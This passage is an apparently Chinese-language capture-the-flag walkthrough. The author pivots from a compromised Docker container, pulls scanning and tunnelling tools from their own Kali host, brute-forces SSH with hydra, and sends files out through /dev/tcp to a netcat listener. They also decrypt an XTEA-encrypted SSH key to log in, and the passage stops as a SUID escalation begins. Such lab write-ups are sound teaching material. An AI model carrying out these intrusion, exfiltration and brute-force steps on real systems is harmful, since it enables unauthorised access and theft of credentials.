drwxr-xr-x    2 root     root          4096 May  9  2019 srv
dr-xr-xr-x   13 root     root             0 Jun 27 08:43 sys
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 tmp
drwxr-xr-x    1 root     root          4096 May 11  2019 usr
drwxr-xr-x    1 root     root          4096 May  9  2019 var
bash-4.4# cd opt
cd opt
bash-4.4# ls -al
ls -al
total 8
drwxr-xr-x    2 root     root          4096 May  9  2019 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
bash-4.4# cd /tmp
cd /tmp
bash-4.4# ls -al
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
bash-4.4# cd hsperfdata_root
cd hsperfdata_root
bash-4.4# ls -al
ls -al
total 40
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 .
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 ..
-rw-------    1 root     root         32768 Jun 27 13:37 1
```

hsperfdata_root是java的日志没啥营养，因为我们就是通过这个进来的

```
bash-4.4# ip a
ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

### 4.1 内网探测

是个docker，拉个fscan来扫描网段

kali开服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80                                                                                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

拉

```
bash-4.4# cd /tmp
cd /tmp
bash-4.4# wget 192.168.205.128/fscan
wget 192.168.205.128/fscan
Connecting to 192.168.205.128 (192.168.205.128:80)
fscan                100% |********************************| 6933k  0:00:00 ETA

bash-4.4# chmod +x fscan
chmod +x fscan
bash-4.4# ./fscan -h 172.17.0.1/16
./fscan -h 172.17.0.1/16

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.3      is alive
[*] LiveTop 172.17.0.0/16    段存活数量为: 3
[*] LiveTop 172.17.0.0/24    段存活数量为: 3
[*] Icmp alive hosts len is: 3
172.17.0.3:8080 open
172.17.0.1:8080 open
172.17.0.2:22 open
172.17.0.2:80 open
172.17.0.1:80 open
172.17.0.1:22 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.17.0.1         code:200 len:6048   title:Linux Terminal Simulator
[*] WebTitle http://172.17.0.2         code:200 len:2808   title:暴力破解技术讲解
[*] WebTitle http://172.17.0.3:8080    code:302 len:0      title:None 跳转url: http://172.17.0.3:8080/login.html
[*] WebTitle http://172.17.0.1:8080    code:302 len:0      title:None 跳转url: http://172.17.0.1:8080/login.html
[*] WebTitle http://172.17.0.3:8080/login.html code:200 len:2377   title:用户登录
[*] WebTitle http://172.17.0.1:8080/login.html code:200 len:2377   title:用户登录
已完成 6/6
[*] 扫描结束,耗时: 9.823162079s
```

172.17.0.1 宿主机 80 8080 22

172.17.0.2 80 22 docker2

17.17.0.3 本机

那先看看.2，80是啥

```
bash-4.4# curl 172.17.0.2
curl 172.17.0.2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt;!DOCTYPE html&gt;
&lt;html lang='zh'&gt;
&lt;head&gt;
  &lt;meta charset='UTF-8'&gt;
  &lt;title&gt;暴力破解技术讲解&lt;/title&gt;
  &lt;style&gt;
    body {
      font-family: 'Microsoft YaHei', sans-serif;
      background: #f5f7fa;
      color: #333;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #2c3e50;
      color: white;
      padding: 20px;
      text-align: center;
    }

    main {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    h2 {
      color: #2c3e50;
      border-bottom: 2px solid #ecf0f1;
      padding-bottom: 5px;
    }

    ul {
      margin-left: 20px;
    }

    code {
      background: #ecf0f1;
      padding: 2px 5px;
      border-radius: 4px;
    }

    footer {
      text-align: center;
      padding: 15px;
      color: #888;
      font-size: 14px;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;header&gt;
    &lt;h1&gt;暴力破解技术讲解&lt;/h1&gt;
  &lt;/header&gt;

  &lt;main&gt;
    &lt;h2&gt;什么是暴力破解？&lt;/h2&gt;
    &lt;p&gt;暴力破解（Brute Force Attack）是一种穷举法攻击方式，攻击者通过尝试所有可能的密码组合，直到找到正确的密码为止。&lt;/p&gt;

    &lt;h2&gt;常见的暴力破解类型&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;纯暴力破解&lt;/strong&gt;：从 &lt;code&gt;aaaa&lt;/code&gt; 到 &lt;code&gt;zzzz&lt;/code&gt; 逐个尝试所有组合。&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;字典攻击&lt;/strong&gt;：使用预设的常用密码列表进行尝试。&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;混合攻击&lt;/strong&gt;：结合字典词和常见变化（如添加123，大小写变换等）。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;暴力破解的特点&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;不依赖漏洞，仅依靠尝试。&lt;/li&gt;
      &lt;li&gt;耗时高，复杂度随密码长度和字符集呈指数增长。&lt;/li&gt;
      &lt;li&gt;可以被自动化脚本执行（如使用 Python、Hydra、John the Ripper 等）。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;防御暴力破解的方法&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;设置&lt;strong&gt;账户锁定&lt;/strong&gt;策略，例如连续错误5次后锁定。&lt;/li&gt;
      &lt;li&gt;加入&lt;strong&gt;验证码&lt;/strong&gt;，阻止自动化脚本。&lt;/li&gt;
      &lt;li&gt;限制&lt;strong&gt;登录速率&lt;/strong&gt;，如 5 分钟内最多尝试 3 次。&lt;/li&gt;
      &lt;li&gt;使用&lt;strong&gt;强密码&lt;/strong&gt;（长且复杂的密码）。&lt;/li&gt;
      &lt;li&gt;监控登录行为，检测异常登录尝试。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;合法用途与警告&lt;/h2&gt;
    &lt;p&gt;暴力破解技术可以用于渗透测试和安全审计，但在未经授权的情况下使用属于违法行为。请务必遵守相关法律法规。&lt;/p&gt;
100  2808  100  2808    0     0  2742k      0 --:--:-- --:--:-- --:--:-- 2742k
/main&gt;
  &lt;!--500-worst-passwords--&gt;
  &lt;footer&gt;
    &amp;copy; 2025 网络安全教学页面 | 仅供学习交流
  &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
```

告诉我们暴力破解，并且给了字典500-worst-passwords

网上扒拉了一下

https://gist.github.com/djaiss/4033452

下载下来，然后扒拉一个chisel过来

### 4.2 内网穿透与SSH爆破

```
bash-4.4# wget 192.168.205.128/chisel
wget 192.168.205.128/chisel
Connecting to 192.168.205.128 (192.168.205.128:80)
chisel               100% |********************************| 9152k  0:00:00 ETA

bash-4.4# chmod +x chisel
chmod +x chisel
```

kali开个监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ./chisel server -p 8081 --reverse
2025/06/27 20:52:53 server: Reverse tunnelling enabled
2025/06/27 20:52:53 server: Fingerprint noxPhEnuZCIYVPVU9OBwffbD6OdVDKc9jcSAUtCtbN0=
2025/06/27 20:52:53 server: Listening on http://0.0.0.0:8081
```

然后靶机docker

```
bash-4.4# ./chisel client 192.168.205.128:8081 R:socks
./chisel client 192.168.205.128:8081 R:socks
2025/06/27 13:51:26 client: Connecting to ws://192.168.205.128:8081
2025/06/27 13:51:26 client: Connected (Latency 698.603µs)
```

连上了，然后他默认是使用socks5代理socks5 127.0.0.1 1080 ，使用代理工具加上就好了

我这使用proxychains

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/proxychains4.conf
[sudo] kali 的密码：
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                                                 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:nCuJTguX/ssJuWNmjLBVoZlUUv1Ygi4k0AFEgPORK5M.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Permission denied, please try again.
root@172.17.0.2's password: 

```

hydra爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q hydra -l root -P 500.txt ssh://172.17.0.2 -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 21:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~8 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: mountain
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 21:07:53
                                  
```

继续

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                            
root@172.17.0.2's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6ab28be27b0c:~# ls -al
total 12
drwx------    1 root     root          4096 Jun 26 05:03 .
drwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..
-rw-------    1 root     root            79 Jun 27 14:12 .ash_history
6ab28be27b0c:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
6ab28be27b0c:~# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

后面这里扒拉了很久，我都没看到，甚至于我都去打内核漏洞了.....

实在顶不住了想去问作者，作者应该是那时候有事，然后我就想到Sublarge应该是测过的，所以我就直接去问他了

Sublarge说是/usr/bin有一个userLogin

```
6ab28be27b0c:~# ls -la /usr/bin/userLogin 
-rwxr-xr-x    1 root     root        772016 Jun 24 13:15 /usr/bin/userLogin
```

## 五、提权之路：解密密钥与最终ROOT

确实有，然后我就想测一下他的功能

```
6ab28be27b0c:~# /usr/bin/userLogin
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin -h
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin --help
error: No such file or directory
```

没有有价值的，那我就想拉过去给kali

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 1234 &gt; userLogin
listening on [any] 1234 ...
```

docker2发送

```
6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
```

不行，瞄眼shell

```
6ab28be27b0c:~# echo $0
-sh
6ab28be27b0c:~# which bash
/bin/bash
6ab28be27b0c:~# /bin/bash
6ab28be27b0c:~# echo $0
/bin/bash
6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
```

行了，拖去ida

### 5.1 二进制逆向与XTEA解密

随便扒拉了一下，是一个加密程序

使用xtea加密，输入文件是id_ed25519，输出output.enc

这里费了老大劲

```
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ vim a.c     
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cat a.c      
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define ENCRYPTED_FILE 'output.enc'
#define DECRYPTED_FILE 'decrypted_file'

const char FIXED_KEY_STR[] = 'key-for-user-ldzid_ed25519';

void gen_key(uint32_t *k) {
    const unsigned char *s = (const unsigned char *)FIXED_KEY_STR;
    for (int i = 0; i &lt; 4; ++i) {
        k[i] = (uint32_t)s[4*i+2] &lt;&lt; 16 |
               (uint32_t)s[4*i+1] &lt;&lt; 8  |
               (uint32_t)s[4*i]        |
               (uint32_t)s[4*i+3] &lt;&lt; 24;
    }
}

void xtea_decrypt(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    const uint32_t delta = 0x9E3779B9;
    const int n_rounds = 64;
    uint32_t sum = delta * n_rounds;

    for (int i = 0; i &lt; n_rounds; ++i) {
        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]);
        sum -= delta;
        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

int main() {
    FILE *fin, *fout;
    uint32_t key[4];
    uint64_t block;
    size_t br;

    printf('开始解密...\n');
    printf('输入文件（加密）: %s\n', ENCRYPTED_FILE);
    printf('输出文件（解密）: %s\n', DECRYPTED_FILE);

    fin = fopen(ENCRYPTED_FILE, 'rb');
    if (!fin) {
        perror('无法打开加密文件');
        return 1;
    }

    fout = fopen(DECRYPTED_FILE, 'wb');
    if (!fout) {
        perror('无法创建输出文件');
        fclose(fin);
        return 1;
    }

    gen_key(key);

    while ((br = fread(&amp;block, 1, 8, fin)) &gt; 0) {
        if (br != 8) {
            printf('\n警告：读取到不完整的数据块 (%zu 字节)，文件可能已损坏。\n', br);
        }

        xtea_decrypt((uint32_t *)&amp;block, key);
        fwrite(&amp;block, 1, 8, fout);
    }

    fclose(fin);
    fclose(fout);

    printf('\n解密完成。\n');
    printf('注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。\n');

    return 0;
}
       
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ gcc a.c -o a                  
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ ./a      
开始解密...
输入文件（加密）: output.enc
输出文件（解密）: decrypted_file

解密完成。
注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ file decrypted_file
decrypted_file: OpenSSH private key
                             
```

### 5.2 普通用户权限获取

因为我这kali部署问题，所以要拉去/tmp连接，你的应该不用

```
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cp decrypted_file /tmp/id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cd /tmp                      
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa    
-rwxr-xr-x 1 kali kali 400  6月27日 21:31 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa   
-rw------- 1 kali kali 400  6月27日 21:31 id_rsa
            
┌──(kali㉿kali)-[/tmp]
└─$ ssh ldz@192.168.205.131 -i /tmp/id_rsa     
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:B9Pod6bX/35WGX2264fO3mYHE9TOsUwS6RGy8ZAswug.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
```

（用户名是在userLogin的伪c里面看到的，当然你也可以使用ssh-keygen -l -f看）继续找东西

```
localhost:~$ ls -la
total 28
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 .
drwxr-xr-x    3 root     root          4096 Apr 28 00:29 ..
-rw-------    1 ldz      ldz             15 Jun 27 22:33 .ash_history
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .ssh
-rw-------    1 ldz      ldz           4178 Jun 26 12:58 .viminfo
-rw-------    1 ldz      ldz             39 Jun 24 10:12 user.txt
localhost:~$ cat user.txt 
flag{ce6560c893e5cfec48e0fd186dc03718}
localhost:~$ cat .viminfo 
# This viminfo file was generated by Vim 9.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/Pub

# Command Line History (newest to oldest):
:wq
|2,0,1750913922,,'wq'
:q
|2,0,1750913922,,'q'
:q!
|2,0,1750786392,,'q!'
:Q
|2,0,1750731057,,'Q'

# Search String History (newest to oldest):
?/Pub
|2,1,1750769276,47,'Pub'

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
''1     LINE    0
        vim .ash_history 
|3,1,1,1,1,0,1750913920,'vim .ash_history '
'2      LINE    0
        history 
|3,0,2,1,1,0,1750913920,'history '
'3      LINE    0

|3,0,3,1,1,0,1750913920,''
'4      LINE    0
            int flag = 0;
|3,0,4,1,1,0,1750786253,'    int flag = 0;'

# File marks:
'0  1  0  ~/.ash_history
|4,48,1,0,1750913922,'~/.ash_history'
'1  13  12  /opt/vuln.c
|4,49,13,12,1750786392,'/opt/vuln.c'
'2  30  0  /opt/vuln.c
|4,50,30,0,1750786258,'/opt/vuln.c'
'3  30  0  /opt/vuln.c
|4,51,30,0,1750786258,'/opt/vuln.c'
'4  43  0  /etc/ssh/sshd_config
|4,52,43,0,1750769292,'/etc/ssh/sshd_config'

# Jumplist (newest first):
-'  1  0  ~/.ash_history
|4,39,1,0,1750913922,'~/.ash_history'
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,'/opt/vuln.c'
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,'/opt/vuln.c'
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,'/opt/vuln.c'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,'/etc/ssh/sshd_config'

# History of marks within files (newest to oldest):

&gt; ~/.ash_history
        *       1750913922      0
        '       1       0
        .       1       0
        +       1       0

&gt; /opt/vuln.c
        *       1750786390      0
        '       13      12
        ^       13      13
        .       13      12
        +       11      0
        +       13      12

&gt; /etc/ssh/sshd_config
        *       1750769290      0
        '       43      0
        ^       43      0
        .       41      0
        +       41      0
localhost:~$ cd .ssh/
localhost:~/.ssh$ ls -al
total 28
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 ..
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:51 authorized_keys
-rw-------    1 ldz      ldz            399 Jun 24 20:43 id_ed25519
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:43 id_ed25519.pub
-rw-------    1 ldz      ldz            828 Jun 25 13:18 known_hosts
-rw-r--r--    1 ldz      ldz             92 Jun 25 13:18 known_hosts.old
localhost:~/.ssh$ ssh-keygen -l -f id_ed25519
256 SHA256:N14sJc5eu0fTD2oG9XrFil1dcsAbsSw3JjqW6vmwheg ldz@localhost (ED25519)
```

### 5.3 SUID提权与PATH劫持

找不到，看到vim的历史记录有修改过/opt/vuln去看看

```
localhost:~/.ssh$ cd /opt/
localhost:/opt$ ls -al
total 40
drwxr-xr-x    5 root     root          4096 Jun 25 01:42 .
drwxr-xr-x   21 root     root          4096 Jun 25 01:45 ..
drwx--x--x    4 root     root          4096 Jun 16 16:03 containerd
drw-------    2 root     root          4096 Jun 24 19:55 server
drw-------    3 root     root          4096 Jun 25 01:52 server2
-rwsr-xr-x    1 root     root         19968 Jun 25 01:33 vuln
localhost:/opt$ ./vuln 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag = 0
password wrong
```

有点像溢出，拖过来看看
老样子，kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lvnp 1234 &gt; vuln     
